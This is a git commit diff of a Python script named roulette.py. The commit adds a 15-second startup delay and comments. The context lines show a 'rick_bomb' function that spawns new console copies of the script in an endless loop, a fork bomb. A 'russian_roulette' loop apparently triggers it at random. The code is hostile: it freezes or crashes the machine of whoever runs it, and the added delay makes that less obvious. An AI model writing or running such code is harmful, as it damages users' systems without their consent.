7bbb8df1a0799a84566785a6486b3f6d75dc9a1f
Austin Rieger <austin_rieger@yahoo.com>
2023-10-31 18:50:44 -0600

    Created delay in roulette, changed roulette call

--- roulette.py
+++ roulette.py
@@ -4,9 +4,12 @@ from time import sleep
 import random
 import subprocess
 
-
+#Number to guess before roulette is called 
 ROULETTE = 4
 
+
+#Delay execution of roulette by x seconds
+DELAY = 15
 def rick_bomb():
         while True:
             subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
@@ -22,6 +25,7 @@ def russian_roulette():
     
     
 if __name__=="__main__":
+    sleep(DELAY)
     while True:
         sleep(.33)
         if russian_roulette():
